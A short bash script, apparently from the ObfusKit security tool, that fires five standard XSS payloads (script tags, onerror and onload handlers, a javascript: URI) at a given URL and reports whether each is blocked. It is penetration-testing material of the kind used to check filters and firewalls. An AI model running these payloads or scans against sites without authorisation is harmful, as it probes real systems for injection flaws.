#!/bin/bash
# Quick XSS Testing Script
# Tests a single URL with common XSS payloads

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}🛡️  ObfusKit Quick XSS Test${NC}"
echo "=================================="

# Check if URL is provided
if [ $# -eq 0 ]; then
    echo -e "${RED}❌ Error: Please provide a target URL${NC}"
    echo "Usage: $0 <target-url>"
    echo "Example: $0 https://example.com/search?q="
    exit 1
fi

TARGET_URL="$1"
echo -e "${YELLOW}🎯 Target: $TARGET_URL${NC}"
echo

# Basic XSS payloads for quick testing
PAYLOADS=(
    '<script>alert(1)</script>'
    '<img src=x onerror=alert(1)>'
    '"><script>alert("XSS")</script>'
    'javascript:alert(1)'
    '<svg onload=alert(1)>'
)

echo -e "${BLUE}🚀 Running quick XSS tests...${NC}"
echo

for i in "${!PAYLOADS[@]}"; do
    payload="${PAYLOADS[$i]}"
    echo -e "${YELLOW}Test $((i+1)): ${NC}$payload"
    
    # Run ObfusKit with the payload
    ./obfuskit -attack xss -payload "$payload" -url "$TARGET_URL" -limit 5 -format json > /tmp/obfuskit_result_$i.json
    
    # Check if any payloads succeeded
    if grep -q '"blocked": false' /tmp/obfuskit_result_$i.json 2>/dev/null; then
        echo -e "${RED}⚠️  Potential XSS vulnerability detected!${NC}"
    else
        echo -e "${GREEN}✅ Payload blocked${NC}"
    fi
    echo
done

echo -e "${BLUE}📊 Test Summary:${NC}"
echo "=================================="
echo "Target tested: $TARGET_URL"
echo "Payloads tested: ${#PAYLOADS[@]}"
echo "Results saved in: /tmp/obfuskit_result_*.json"
echo
echo -e "${YELLOW}💡 For comprehensive testing, use:${NC}"
echo "./obfuskit -attack xss -url '$TARGET_URL' -threads 5 -progress -fingerprint"

# Cleanup
rm -f /tmp/obfuskit_result_*.json
